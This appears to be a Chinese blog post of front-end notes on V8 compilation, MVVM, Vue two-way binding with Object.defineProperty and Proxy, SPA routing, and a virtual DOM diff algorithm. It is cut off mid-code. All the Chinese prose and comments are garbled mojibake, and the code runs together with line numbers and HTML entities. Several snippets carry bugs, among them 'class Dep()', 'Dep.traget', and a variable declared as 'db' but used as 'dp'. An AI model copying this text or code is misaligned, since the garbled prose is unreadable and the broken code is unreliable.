è´Ÿè´£å°† AST è½¬æ¢ä¸º Bytecode ,ç„¶åŽ TurboFan è´Ÿè´£ç¼–è¯‘ä¼˜åŒ–åŽçš„ Machine Codeï¼Œå¹¶ Machine Code åœ¨æ‰§è¡Œæ•ˆçŽ‡ä¸Šä¼˜äºŽ Bytecode. JS æ˜¯ä¸€é—¨åŠ¨æ€ç±»åž‹çš„è¯­è¨€ï¼Œè€Œä¸”æœ‰ä¸€å †çš„è§„åˆ™ï¼Œç®€å•çš„åŠ æ³•è¿ç®—ä»£ç ï¼Œå†…å®¹å°±è¦è€ƒè™‘å¥½å‡ ç§è§„åˆ™ï¼Œæ¯”å¦‚æ•°å­—ç›¸åŠ ã€å­—ç¬¦ä¸²ç›¸åŠ ã€å¯¹è±¡å’Œå­—ç¬¦ä¸²ç­‰ç­‰ã€‚è¿™ç§æƒ…å†µå°±ä¼šå¯¼è‡´å†…éƒ¨è¦å¢žåŠ å¾ˆå¤šåˆ¤æ–­é€»è¾‘ï¼Œé™ä½Žè¿è¡Œæ•ˆçŽ‡ã€‚ å¦‚æžœå›ºå®šäº†ç±»åž‹ï¼Œå°±ä¸éœ€è¦æ‰§è¡Œå¾ˆå¤šåˆ¤æ–­é€»è¾‘ï¼Œä»£ç å¯ä»¥ç¼–è¯‘ä¸º Machine Codeã€‚ts çš„å¥½å¤„ï¼Ÿ å¦‚æžœæˆ‘ä»¬ä¸€æ—¦ä¼ å…¥çš„å‚æ•°ç±»åž‹æ”¹å˜ï¼Œé‚£ä¹ˆ Machine Code å°±ä¼šè¢« DeOptimized ä¸º ByteCodeï¼Œè¿™æ ·å°±æœ‰æ€§èƒ½ä¸Šçš„ä¸€ä¸ªæŸè€—ã€‚æ‰€ä»¥æˆ‘ä»¬å¦‚æžœå¸Œæœ›diamèƒ½å¤šçš„ç¼–è¯‘ä¸º Machine Code å¹¶ä¸” DeOptimized çš„æ¬¡æ•°å‡å°‘ï¼Œå°±åº”è¯¥å°½å¯èƒ½ä¿è¯ä¼ å…¥çš„ç±»åž‹ä¸€è‡´ã€‚ æ¡†æž¶é€šè¯†MVVM(View+Model+ViewModel)ä¼ ç»Ÿçš„ MVC æž¶æž„é€šå¸¸æ˜¯ä½¿ç”¨æŽ§åˆ¶å™¨æ›´æ–°æ¨¡åž‹ï¼Œè§†å›¾ä»Žæ¨¡åž‹ä¸­èŽ·å–æ•°æ®åŽ»æ¸²æŸ“ï¼Œå½“æœ‰ç”¨æˆ·è¾“å…¥çš„æ—¶å€™ï¼Œä¼šé€šè¿‡æŽ§åˆ¶å™¨åŽ»æ›´æ–°æ¨¡åž‹ï¼Œå¹¶ä¸”é€šçŸ¥è§†å›¾è¿›è¡Œæ›´æ–°ï¼Œä½†æ˜¯ MVC æž¶æž„çš„ä¸€ä¸ªå·¨å¤§çš„ç¼ºé¡¹å°±æ˜¯æŽ§åˆ¶æ‰¿æ‹…çš„è´£ä»»å¤ªå¤§äº†ï¼Œéšç€é¡¹ç›®çš„æ„ˆåŠ å¤æ‚ï¼ŒæŽ§åˆ¶å™¨ä¸­çš„ä»£ç ä¼šè¶Šæ¥è¶Šè‡ƒè‚¿ï¼Œå¯¼è‡´å‡ºçŽ°ä¸åˆ©äºŽç»´æŠ¤çš„æƒ…å†µã€‚ MVVM ç”±ä¸‰ä¸ªå†…å®¹ç»„æˆï¼š Viewï¼šç•Œé¢ Modelï¼šæ•°æ®æ¨¡åž‹ ViewModelï¼šä½œä¸ºæ¡¥æ¢è´Ÿè´£æ²Ÿé€š View å’Œ Model åœ¨ JQuery æ—¶æœŸï¼Œå¦‚æžœéœ€è¦åˆ·æ–° UI æ—¶ï¼Œéœ€è¦å…ˆå–åˆ°å¯¹åº”çš„ DOM å†æ›´æ–° UIï¼Œè¿™æ ·æ•°æ®å’Œä¸šåŠ¡çš„é€»è¾‘å°±å’Œé¡µé¢æœ‰å¼ºè€¦åˆã€‚ ViewModel åªå…³å¿ƒæ•°æ®å’Œä¸šåŠ¡çš„å¤„ç†ï¼Œä¸å…³å¿ƒ View æ˜¯æ€Žä¹ˆå¤„ç†æ•°æ®çš„ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼ŒView å’Œ Model éƒ½å¯ä»¥ç‹¬ç«‹å‡ºæ¥ï¼Œä»»ä½•ä¸€æ–¹æ”¹å˜äº†ä¹Ÿä¸ä¸€å®šéœ€è¦æ”¹å˜å¦ä¸€æ–¹ï¼Œå¹¶ä¸”å¯ä»¥å°†ä¸€äº›å¤ç”¨çš„é€»è¾‘æ”¾åœ¨ä¸€ä¸ª ViewModel ä¸­ï¼Œè®©å¤šä¸ª View å¤ç”¨è¿™ä¸ª ViewModelã€‚ä»¥ Vue æ¡†æž¶ä¸ºä¾‹å­ï¼ŒViewModel å°±æ˜¯ç»„ä»¶çš„å®žä¾‹ï¼ŒView å°±æ˜¯æ¨¡æ¿ï¼ŒModel åœ¨å¼•å…¥äº† Vuex çš„æƒ…å†µä¸‹æ˜¯å®Œå…¨å¯ä»¥å’Œç»„ä»¶åˆ†ç¦»çš„ã€‚åœ¨ MVVM ä¸­è¿˜å¼•å…¥äº†ä¸€ä¸ªéšå¼çš„ Binder å±‚ï¼Œå®žçŽ°äº† View å’Œ ViewModel çš„ç»‘å®šï¼Œåœ¨Vue ä¸­ï¼Œè¿™ä¸ªéšå¼çš„ Binder å±‚å°±æ˜¯Vue é€šè¿‡è§£æžæ¨¡æ¿ä¸­çš„æ’å€¼å’ŒæŒ‡ä»¤ä»Žè€Œå®žçŽ° View å’Œ ViewModel çš„ç»‘å®šã€‚ åœ¨ MVVM ä¸­ï¼Œæœ€æ ¸å¿ƒçš„ä¹Ÿå°±æ˜¯æ•°æ®åŒå‘ç»‘å®šï¼Œä¾‹å¦‚ Angluar çš„è„æ•°æ®æ£€æµ‹ï¼ŒVue ä¸­çš„æ•°æ®åŠ«æŒã€‚ è„æ•°æ®ç›‘æµ‹å½“è§¦å‘äº†æŒ‡å®šäº‹ä»¶åŽä¼šè¿›å…¥è„æ•°æ®æ£€æµ‹ï¼Œè¿™æ—¶ä¼šè°ƒç”¨ $digest å¾ªçŽ¯éåŽ†æ‰€æœ‰çš„æ•°æ®è§‚å¯Ÿè€…ï¼Œåˆ¤æ–­å½“å‰å€¼æ˜¯å¦å’Œå…ˆå‰çš„å€¼æœ‰åŒºåˆ«ï¼Œå¦‚æžœæ£€æµ‹åˆ°å˜åŒ–çš„è¯ï¼Œä¼šè°ƒç”¨ $watch å‡½æ•°ï¼Œç„¶åŽå†æ¬¡è°ƒç”¨ $digest å¾ªçŽ¯ç›´åˆ°å‘çŽ°æ²¡æœ‰å˜åŒ–ã€‚å¾ªçŽ¯è‡³å°‘ä¸ºäºŒæ¬¡ ï¼Œè‡³å¤šä¸ºåæ¬¡ã€‚ è„æ•°æ®æ£€æµ‹è™½ç„¶å­˜åœ¨ä½Žæ•ˆçš„é—®é¢˜ï¼Œä½†æ˜¯ä¸å…³å¿ƒæ•°æ®æ˜¯é€šè¿‡ä»€ä¹ˆæ–¹å¼æ”¹å˜çš„ï¼Œéƒ½å¯ä»¥å®Œæˆä»»åŠ¡ï¼Œä½†æ˜¯è¿™åœ¨ Vue ä¸­çš„åŒå‘ç»‘å®šæ˜¯å­˜åœ¨é—®é¢˜çš„ã€‚å¹¶ä¸”è„æ•°æ®æ£€æµ‹å¯ä»¥å®žçŽ°æ‰¹é‡æ£€æµ‹å‡ºæ›´æ–°çš„å€¼ï¼Œå†åŽ»ç»Ÿä¸€æ›´æ–° UIï¼Œå¤§å¤§å‡å°‘äº†æ“ä½œ DOM çš„æ¬¡æ•°ã€‚æ‰€ä»¥ä½Žæ•ˆä¹Ÿæ˜¯ç›¸å¯¹çš„ï¼Œè¿™å°±ä»è€…è§ä»æ™ºè€…è§æ™ºäº†ã€‚ æ•°æ®åŠ«æŒVue å†…éƒ¨ä½¿ç”¨äº† Object.defineProperty() æ¥å®žçŽ°åŒå‘ç»‘å®šï¼Œé€šè¿‡è¿™ä¸ªå‡½æ•°å¯ä»¥ç›‘å¬åˆ° set å’Œ get çš„äº‹ä»¶ã€‚ 1234567891011121314151617181920212223242526272829var data = &#123;name:'yck'&#125;observe(data)let name = data.namedata.name = 'yyy'function observe(obj)&#123; if(!obj || typeof obj !== 'object')&#123; return &#125; Object.keys(obj).forEach(key=&gt;&#123; defineReactive(obj,key,obj[key]); &#125;)&#125;function defineReactive(obj,key,val)&#123; // é€’å½’å­å±žæ€§ observe(val); Object.defineProperty(obj,key,&#123; enumerable:true, configurable:true, get:function rectiveGetter()&#123; console.log('get value'); return val; &#125;, set:function rectiveSetter(newVal)&#123; console.log('change value'); val = newVal; &#125; &#125;);&#125; ä»¥ä¸Šä»£ç ç®€å•çš„å®žçŽ°äº†å¦‚ä½•ç›‘å¬æ•°æ®çš„ set å’Œ get çš„äº‹ä»¶ï¼Œä½†æ˜¯ä»…ä»…å¦‚æ­¤æ˜¯ä¸å¤Ÿçš„ï¼Œè¿˜éœ€è¦åœ¨é€‚å½“çš„æ—¶å€™ç»™å±žæ€§æ·»åŠ å‘å¸ƒè®¢é˜… 1&lt;div&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt; åœ¨è§£æžå¦‚ä¸Šæ¨¡æ¿ä»£ç æ—¶ï¼Œé‡åˆ° å°±ä¼šç»™å±žæ€§ name æ·»åŠ å‘å¸ƒè®¢é˜…ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445// é€šè¿‡Dep è§£è€¦class Dep()&#123; constructor()&#123; this.subs = [] &#125; addSub(sub)&#123; // sub æ˜¯ Watcher å®žä¾‹ this.subs.push(sub) &#125; notify()&#123; this.subs.forEach(sub=&gt;&#123; sub.update() &#125;) &#125; &#125;// å…¨å±€å±žæ€§ï¼Œé€šè¿‡è¯¥å±žæ€§é…ç½® WatcherDep.target = null;function update(value)&#123; document.querySelector('div').innerText = value;&#125;class Watcher&#123; constructor(obj,key,cb)&#123; // Dep.target æŒ‡å‘è‡ªå·±ï¼Œç„¶åŽè§¦å‘å±žæ€§çš„ getter æ·»åŠ ç›‘å¬ï¼Œæœ€åŽå°† Dep.target ç½®ç©º Dep.target = this; this.cb = cb; this.key = key; this.obj = obj; this.value = obj[key] Dep.target = null &#125; update()&#123; // èŽ·å¾—æ–°å€¼ this.value = this.obj[this.key]; // è°ƒç”¨ update æ–¹æ³•æ›´æ–° dom this.cb(this.value); &#125;&#125;var data = &#123;name:'yck'&#125;observe(data)// æ¨¡æ‹Ÿè§£æžåˆ° &#123;&#123;name&#125;&#125; è§¦å‘çš„æ“ä½œnew Watcher(data,'name',update)// update dom innerHtmldata.name = 'yyy' æŽ¥ä¸‹æ¥,å¯¹ defineReactive å‡½æ•°è¿›è¡Œæ”¹é€  1234567891011121314151617181920212223function defineReactive(obj,key,val)&#123; // é€’å½’å­å±žæ€§ observe(val) let db = new Dep(); Object.defineProperty(obj,key,&#123; enumerable:true, configurable:true, get:function reactiveGetter()&#123; console.log('get value'); // å°† Watcher æ·»åŠ åˆ° è®¢é˜… if(Dep.traget)&#123; dp.addSub(Dep.target) &#125; return val; &#125;, set:function reactiveSetter(newVal)&#123; console.log('change value'); val = newVal; // æ‰§è¡Œ watcher çš„ update æ–¹æ³• dp.notify(); &#125; &#125;)&#125; ä»¥ä¸Šå®žçŽ°äº†ä¸€ä¸ªç®€æ˜“çš„åŒå‘ç»‘å®šï¼Œæ ¸å¿ƒæ€è·¯å°±æ˜¯æ‰‹åŠ¨è§¦å‘ä¸€æ¬¡å±žæ€§çš„ getter æ¥å®žçŽ°å‘å¸ƒè®¢é˜…çš„æ·»åŠ ã€‚ Proxy ä¸Ž Object.defineProperty å¯¹æ¯”Object.defineProperty è™½ç„¶å·²ç»èƒ½å¤Ÿå®žçŽ°åŒå‘ç»‘å®šäº†ï¼Œä½†æ˜¯ä»–è¿˜æ˜¯æœ‰ç¼ºé™·çš„ã€‚ åªèƒ½å¯¹å±žæ€§è¿›è¡Œæ•°æ®åŠ«æŒï¼Œæ‰€ä»¥éœ€è¦æ·±åº¦éåŽ†æ•´ä¸ªå¯¹è±¡ å¯¹äºŽæ•°ç»„ä¸èƒ½ç›‘å¬åˆ°æ•°æ®çš„å˜åŒ– è™½ç„¶ Vue ä¸­ç¡®å®žèƒ½æ£€æµ‹åˆ°æ•°ç»„æ•°æ®çš„å˜åŒ–ï¼Œä½†æ˜¯å…¶å®žæ˜¯ä½¿ç”¨äº† hack çš„åŠžæ³•ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯æœ‰ç¼ºé™·çš„ã€‚ 1234567891011121314151617181920212223242526272829303132333435const arrayProto = Array.prototypeexport const arrayMethods = Object.create(arrayProto)// hack ä»¥ä¸‹å‡ ä¸ªå‡½æ•°const methodsToPatch = [ 'push', 'pop', 'shift', 'unshift', 'splice', 'sort', 'reverse']methodsToPatch.forEach(function(method) &#123; // èŽ·å¾—åŽŸç”Ÿå‡½æ•° const original = arrayProto[method] def(arrayMethods, method, function mutator(...args) &#123; // è°ƒç”¨åŽŸç”Ÿå‡½æ•° const result = original.apply(this, args) const ob = this.__ob__ let inserted switch (method) &#123; case 'push': case 'unshift': inserted = args break case 'splice': inserted = args.slice(2) break &#125; if (inserted) ob.observeArray(inserted) // è§¦å‘æ›´æ–° ob.dep.notify() return result &#125;)&#125;) åè§‚ Proxy å°±æ²¡ä»¥ä¸Šçš„é—®é¢˜ï¼ŒåŽŸç”Ÿæ”¯æŒç›‘å¬æ•°ç»„å˜åŒ–ï¼Œå¹¶ä¸”å¯ä»¥ç›´æŽ¥å¯¹æ•´ä¸ªå¯¹è±¡è¿›è¡Œæ‹¦æˆªï¼Œæ‰€ä»¥ Vue ä¹Ÿå°†åœ¨ä¸‹ä¸ªå¤§ç‰ˆæœ¬ä¸­ä½¿ç”¨ Proxy æ›¿æ¢ Object.defineProperty 123456789101112131415161718192021222324252627let onWatch = (obj, setBind, getLogger) =&gt; &#123; let handler = &#123; get(target, property, receiver) &#123; getLogger(target, property) return Reflect.get(target, property, receiver) &#125;, set(target, property, value, receiver) &#123; setBind(value) return Reflect.set(target, property, value) &#125; &#125; return new Proxy(obj, handler)&#125;let obj = &#123; a: 1 &#125;let valuelet p = onWatch( obj, v =&gt; &#123; value = v &#125;, (target, property) =&gt; &#123; console.log(`Get '$&#123;property&#125;' = $&#123;target[property]&#125;`) &#125;)p.a = 2 // bind `value` to `2`p.a // -&gt; Get 'a' = 2 è·¯ç”±åŽŸç†å‰ç«¯è·¯ç”±å®žçŽ°èµ·æ¥å…¶å®žå¾ˆç®€å•ï¼Œæœ¬è´¨å°±æ˜¯ç›‘å¬ URL çš„å˜åŒ–ï¼Œç„¶åŽåŒ¹é…è·¯ç”±è§„åˆ™ï¼Œæ˜¾ç¤ºç›¸åº”çš„é¡µé¢ï¼Œå¹¶ä¸”æ— é¡»åˆ·æ–°ã€‚ç›®å‰å•é¡µé¢ä½¿ç”¨çš„è·¯ç”±å°±åªæœ‰ä¸¤ç§å®žçŽ°æ–¹å¼ hash æ¨¡å¼ history æ¨¡å¼ www.text.com/##/ å°±æ˜¯ Hash URL ï¼Œå½“ ## åŽé¢çš„ å“ˆå¸Œå€¼å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œä¸ä¼šå‘æœåŠ¡å™¨è¯·æ±‚æ•°æ®ï¼Œå¯ä»¥é€šè¿‡ hashchaneg äº‹ä»¶æ¥ç›‘å¬åˆ° URL çš„å˜åŒ–ï¼Œä»Žè€Œè¿›è¡Œè·³è½¬é¡µé¢ã€‚ History æ¨¡å¼æ˜¯ HTML5 æ–°æŽ¨å‡ºçš„åŠŸèƒ½ï¼Œæ¯”ä¹‹ Hash URL æ›´åŠ ç¾Žè§‚ Virtual Domä¸ºä»€ä¹ˆéœ€è¦ Virtual Domæ“ä½œ DOM æ˜¯ä¸€ä»¶å¾ˆè€—è´¹æ€§èƒ½çš„äº‹æƒ…ï¼Œå¯ä»¥é€šè¿‡ JS å¯¹è±¡æ¥æ¨¡æ‹Ÿ DOM å¯¹è±¡ã€‚ 123456789101112131415const ul = &#123; tag:'ul', props:&#123; class:'list' &#125;, children:&#123; tag:'li', children:'1' &#125;&#125;// ç›¸å½“äºŽ/** &lt;ul class='list'&gt; &lt;li&gt;1&lt;/li&gt;&lt;/ul&gt;*/ ä¾‹å­ï¼š 12345// å‡è®¾è¿™é‡Œæ¨¡æ‹Ÿä¸€ä¸ª ulï¼Œå…¶ä¸­åŒ…å«äº† 5 ä¸ª li;[1, 2, 3, 4, 5][ // è¿™é‡Œæ›¿æ¢ä¸Šé¢çš„ li (1, 2, 5, 4)] ä»Žä¸Šè¿°ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä¸€çœ¼å°±å¯ä»¥çœ‹å‡ºå…ˆå‰çš„ ul ä¸­çš„ç¬¬ä¸‰ä¸ª li è¢«ç§»é™¤äº†ï¼Œå››äº”æ›¿æ¢äº†ä½ç½®ã€‚ å¦‚æžœä»¥ä¸Šæ“ä½œå¯¹åº”åˆ° DOM ä¸­ï¼Œé‚£ä¹ˆå°±æ˜¯ä»¥ä¸‹ä»£ç  123456789// åˆ é™¤ç¬¬ä¸‰ä¸ª liul.childNodes[2].remove()// å°†ç¬¬å››ä¸ª li å’Œç¬¬äº”ä¸ªäº¤æ¢ä½ç½®let fromNode = ul.childNodes[4]let toNode = node.childNodes[3]let cloneFromNode = fromNode.cloneNode(true)let cloenToNode = toNode.cloneNode(true)ul.replaceChild(cloneFromNode, toNode)ul.replaceChild(cloenToNode, fromNode) å½“ç„¶åœ¨å®žé™…æ“ä½œä¸­ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ç»™æ¯ä¸ªèŠ‚ç‚¹ä¸€ä¸ªæ ‡è¯†ï¼Œä½œä¸ºåˆ¤æ–­æ˜¯åŒä¸€ä¸ªèŠ‚ç‚¹çš„ä¾æ®ã€‚æ‰€ä»¥è¿™ä¹Ÿæ˜¯ Vue å’Œ React ä¸­å®˜æ–¹æŽ¨èåˆ—è¡¨é‡Œçš„èŠ‚ç‚¹ä½¿ç”¨å”¯ä¸€çš„ key æ¥ä¿è¯æ€§èƒ½ã€‚ é‚£ä¹ˆæ—¢ç„¶ DOM å¯¹è±¡å¯ä»¥é€šè¿‡ JS å¯¹è±¡æ¥æ¨¡æ‹Ÿï¼Œåä¹‹ä¹Ÿå¯ä»¥é€šè¿‡ JS å¯¹è±¡æ¥æ¸²æŸ“å‡ºå¯¹åº”çš„ DOM ä»¥ä¸‹æ˜¯ä¸€ä¸ª JS å¯¹è±¡æ¨¡æ‹Ÿ DOM å¯¹è±¡çš„ç®€å•å®žçŽ° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566export default class Element &#123; /** * @param &#123;String&#125; tag 'div' * @param &#123;Object&#125; props &#123;class:'item'&#125; * @param &#123;Array&#125; child [Element1,'text] * @param &#123;String&#125; key option */ constructor(tag, props, children, key) &#123; this.tag = tag; this.props = props; if (Array.isArray(children)) &#123; this.children = children; &#125; else if (isString(children)) &#123; this.key = children; this.children = null &#125; if (key) this.key = key; &#125; // æ¸²æŸ“ render() &#123; let root = this._createElement( this.tag, this.props, this.children, this.key ) document.body.appendChild(root) return root; &#125; create() &#123; return this._createElement(this.tag, this.props, this.children, this.key) &#125; // åˆ›å»ºèŠ‚ç‚¹ _createElement(tag, props, child, key) &#123; // é€šè¿‡ tag åˆ›å»ºèŠ‚ç‚¹ let el = document.createElement(tag); // è®¾ç½®èŠ‚ç‚¹å±žæ€§ for (const key in props) &#123; if (props.hasOwnProperty(key)) &#123; const value = props[key]; el.setAttribute(key, value); &#125; &#125; if (key) &#123; el.setAttribute('key', key) &#125; // é€’å½’æ·»åŠ å­èŠ‚ç‚¹ if (child) &#123; child.forEach(elememt =&gt; &#123; let child; if (element instanceof Element) &#123; child = this._createElement( elememt.tag, elememt.props, elememt.children, elememt.key ) &#125; else &#123; child = document.createTextNode(elememt) &#125; el.appendChild(child) &#125;); &#125; return el; &#125;&#125; Virtual Dom ç®—æ³•ç®€è¿°DOM æ˜¯å¤šå‰æ ‘ç»“æž„ï¼Œå¦‚æžœéœ€è¦å®Œæ•´çš„å¯¹æ¯”ä¸¤æ£µæ ‘çš„å·®å¼‚ï¼Œé‚£ä¹ˆéœ€è¦çš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(n ^ 3)ã€‚React å›¢é˜Ÿä¼˜åŒ–äº†ç®—æ³•ï¼Œå®žçŽ°äº† O(n) çš„å¤æ‚åº¦æ¥å¯¹æ¯”å·®å¼‚ã€‚ å…³é”®åœ¨äºŽåªæ˜¯å¯¹æ¯”åŒå±‚çš„èŠ‚ç‚¹ï¼Œè€Œä¸æ˜¯è·¨å±‚å¯¹æ¯”ï¼Œè¿™ä¹Ÿæ˜¯è€ƒè™‘åˆ°åœ¨å®žé™…ä¸šåŠ¡ä¸­å¾ˆå°‘å›žåŽ»è·¨å±‚ç§»åŠ¨ DOM å…ƒç´ ã€‚ åˆ¤æ–­å·®å¼‚ç®—æ³•åˆ†æˆäº†ä¸¤æ­¥ é¦–å…ˆä»Žä¸Šåˆ°ä¸‹ï¼Œä»Žå·¦åˆ°å³éåŽ†å¯¹è±¡ï¼Œè¦å°±æ˜¯æ ‘çš„æ·±åº¦éåŽ†ï¼Œè¿™ä¸€æ­¥ä¼šç»™æ¯ä¸ªèŠ‚ç‚¹æ·»åŠ ç´¢å¼•ï¼Œä¾¿äºŽåŽé¢æ¸²æŸ“å·®å¼‚ ä¸€æ—¦èŠ‚ç‚¹æœ‰å­å…ƒç´ ï¼Œå°±åŽ»åˆ¤æ–­å­å…ƒç´ æ˜¯å¦æœ‰ä¸åŒ Virtual Dom ç®—æ³•å®žçŽ°æ ‘çš„é€’å½’ é¦–å…ˆå®žçŽ°æ ‘çš„é€’å½’éåŽ†ï¼Œåœ¨å®žçŽ°è¯¥ç®—æ³•å‰ï¼Œè€ƒè™‘ä¸¤ä¸ªèŠ‚ç‚¹å¯¹æ¯”å‡ºçŽ°çš„å‡ ç§æƒ…å†µï¼š æ–°çš„èŠ‚ç‚¹ tagName æˆ–è€… key å’Œæ—§çš„ä¸åŒï¼Œè¿™ç§æƒ…å†µä»£è¡¨éœ€è¦æ›¿æ¢æ—§çš„èŠ‚ç‚¹ï¼Œå¹¶ä¹Ÿä¸å†éœ€è¦éåŽ†æ–°æ—§å­å…ƒç´ äº†ï¼Œå› ä¸ºæ•´ä¸ªæ—§èŠ‚ç‚¹éƒ½è¢«åˆ é™¤æŽ‰äº†ã€‚ æ–°çš„èŠ‚ç‚¹çš„ tagName å’Œ key ï¼ˆå¯èƒ½éƒ½æ²¡æœ‰ï¼‰å’Œæ—§çš„ç›¸åŒï¼Œå¼€å§‹éåŽ†å­æ ‘ æ²¡æœ‰æ–°çš„èŠ‚ç‚¹ï¼Œé‚£ä¹ˆä»€ä¹ˆéƒ½ä¸ç”¨åš 123456789101112131415161718192021222324252627282930313233343536import &#123; StateEnums, isString, move &#125; from './util'import Element from './element'export default function diff(oldDomTree, newDomTree) &#123; // ç”¨äºŽè®°å½•å·®å¼‚ let pathchs = &#123;&#125;; // ä¸€å¼€å§‹çš„ç´¢å¼•ä¸º0 dfs(oldDomTree, newDomTree, 0, pathchs) return pathchs&#125;function dfs(oldNode, newNode, index, patches) &#123; // ç”¨äºŽä¿å­˜å­æ ‘çš„æ›´æ”¹ let curPatches = []; // éœ€è¦åˆ¤æ–­ä¸‰ç§æƒ…å†µï¼š // 1.æ²¡æœ‰æ–°çš„èŠ‚ç‚¹ï¼Œé‚£ä¹ˆä»€ä¹ˆéƒ½ä¸åš // 2.æ–°çš„èŠ‚ç‚¹çš„ tagName å’Œ keyï¼ˆå¯èƒ½éƒ½æ²¡æœ‰ï¼‰å’Œæ—§çš„ç›¸åŒï¼Œå¼€å§‹éåŽ†å­æ ‘ // 3.æ²¡æœ‰æ–°çš„èŠ‚ç‚¹ï¼Œé‚£ä¹ˆä»€ä¹ˆéƒ½ä¸ç”¨åš if (!newNode) &#123; &#125; else if (newNode.tag === oldNode.tag &amp;&amp; newNode.key === oldNode.key) &#123; // åˆ¤æ–­å±žæ€§æ˜¯å¦å˜æ›´ let props = diffProps(oldNode.props, newNode.props) if (props.length) curPatches.push(&#123; type: StateEnums.ChangeProps, props &#125;) // éåŽ†å­æ ‘ diffChildren(oldNode.children, newNode.children, index, patches) &#125; else &#123; // èŠ‚ç‚¹ä¸åŒï¼Œéœ€è¦æ›¿æ¢ curPatches.push(&#123; type: StateEnums.Replace, node: newNode &#125;) &#125; if (curPatches.length) &#123; if (patches[index]) &#123; patches[index] = patches[index].concat(curPatches) &#125; else &#123; patches[index] = curPatches; &#125; &#125;&#125; åˆ¤æ–­å±žæ€§çš„æ›´æ”¹ åˆ¤æ–­å±žæ€§çš„æ›´æ”¹ä¹Ÿåˆ†æˆä¸‰ä¸ªæ­¥éª¤ éåŽ†æ—§çš„å±žæ€§åˆ—è¡¨ï¼ŒæŸ¥çœ‹æ¯ä¸ªå±žæ€§æ˜¯å¦è¿˜å­˜åœ¨äºŽæ–°çš„å±žæ€§åˆ—è¡¨ä¸­ éåŽ†æ–°çš„å±žæ€§åˆ—è¡¨ï¼Œåˆ¤æ–­ä¸¤ä¸ªåˆ—è¡¨ä¸­éƒ½å­˜åœ¨çš„å±žæ€§çš„å€¼æ˜¯å¦å­˜åœ¨å˜åŒ– åœ¨ç¬¬äºŒæ­¥ä¸­åŒæ—¶æŸ¥çœ‹æ˜¯å¦æœ‰å±žæ€§ä¸å­˜åœ¨ä¸Žæ—§çš„å±žæ€§åˆ—åˆ—è¡¨ä¸­ 12345678910111213141516171819202122232425function diffProps(oldProps, newProps) &#123; let change = []; for (const key in oldProps) &#123; if (oldProps.hasOwnProperty(key) &amp;&amp; !newProps[key]) &#123; change.push(&#123; prop: key &#125;) &#125; &#125; for (const key in newProps) &#123; if (newProps.hasOwnProperty(key)) &#123; const prop = newProps[key]; if (oldProps[key] &amp;&amp; oldProps[key] !== newProps[key]) &#123; change.push(&#123; prop: key, value: newProps[key] &#125;) &#125; else if (!oldProps[key]) &#123; change.push(&#123; prop: key, value: newProps[key] &#125;) &#125; &#125; &#125; return change;&#125; åˆ¤æ–­åˆ—è¡¨å·®å¼‚ç®—æ³•å®žçŽ° æ•´ä¸ª Virtual Dom ä¸­æœ€æ ¸å¿ƒçš„ç®—æ³•ï¼Œè¿™é‡Œçš„ä¸»è¦æ­¥éª¤å…¶å®žå’Œåˆ¤æ–­å±žæ€§å·®å¼‚æ˜¯ç±»ä¼¼çš„ï¼Œä¹Ÿæ˜¯åˆ†æˆä¸‰ä¸ªæ­¥éª¤ï¼š éåŽ†æ—§çš„èŠ‚ç‚¹åˆ—è¡¨ï¼ŒæŸ¥çœ‹æ¯ä¸ªèŠ‚ç‚¹æ˜¯å¦è¿˜å­˜åœ¨æ–°çš„èŠ‚ç‚¹åˆ—è¡¨ä¸­ éåŽ†æ–°çš„èŠ‚ç‚¹åˆ—è¡¨ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰æ–°çš„èŠ‚ç‚¹ åœ¨ç¬¬äºŒæ­¥ä¸­åŒæ—¶åˆ¤æ–­èŠ‚ç‚¹æ˜¯å¦æœ‰ç§»åŠ¨ è¯¥ç®—æ³•åªå¯¹æœ‰ key çš„èŠ‚ç‚¹åšå¤„ç† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172function listDiff(oldList, newList, index, patches) &#123; // ä¸ºäº†éåŽ†æ–¹ä¾¿ï¼Œå…ˆå–å‡ºä¸¤ä¸ª list ä¸­æ‰€æœ‰çš„ keys let oldKeys = getKeys(oldList); let newKeys = getKeys(newList); let changes = []; // ç”¨äºŽä¿å­˜å˜æ›´åŽçš„èŠ‚ç‚¹æ•°æ®ï¼Œä½¿ç”¨è¯¥æ•°ç»„ä¿å­˜æœ‰ä»¥ä¸‹å¥½å¤„ï¼Œ // 1.å¯ä»¥æ­£ç¡®èŽ·å–è¢«åˆ é™¤èŠ‚ç‚¹ç´¢å¼• // 2.äº¤æ¢ä½ç½®åªéœ€è¦æ“ä½œä¸€é dom // 3.ç”¨äºŽ diffChildren å‡½æ•°ä¸­çš„åˆ¤æ–­ï¼Œåªéœ€è¦éåŽ† // ä¸¤ä¸ªæ ‘ä¸­éƒ½å­˜åœ¨çš„èŠ‚ç‚¹ï¼Œå¯¹äºŽæ–°å¢žæˆ–è€…åˆ é™¤çš„èŠ‚ç‚¹æ¥è¯´ï¼Œå®Œå…¨æ²¡æœ‰å¿…è¦å†åŽ»åˆ¤æ–­ä¸€æ¬¡ let list = []; oldList &amp;&amp; oldList.forEach(item =&gt; &#123; let key = item.key; if (isString(item)) &#123; key = item &#125; // å¯»æ‰¾æ–°çš„ children ä¸­æ˜¯å¦å«æœ‰å½“å‰èŠ‚ç‚¹ï¼Œæ²¡æœ‰çš„è¯éœ€è¦åˆ é™¤ let index = newKeys.indexOf(key); if (index === -1) &#123; list.push(null); &#125; else &#123; list.push(key) &#125; &#125;) // éåŽ†å˜æ›´åŽçš„æ•°ç»„ let length = list.length; // å› ä¸ºåˆ é™¤æ•°ç»„å…ƒç´ æ˜¯ä¼šæ›´æ”¹ç´¢å¼•çš„ï¼Œæ‰€ä»¥ä»ŽåŽå¾€å‰åˆ å¯ä»¥ä¿è¯ç´¢å¼•ä¸å˜ for (let i = length - 1; i &gt;= 0; i--) &#123; // åˆ¤æ–­å½“å‰å…ƒç´ æ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºåˆ™è¡¨ç¤ºè¦åˆ é™¤ if (!list[i]) &#123; list.splice(i, 1) changes.push(&#123; type: 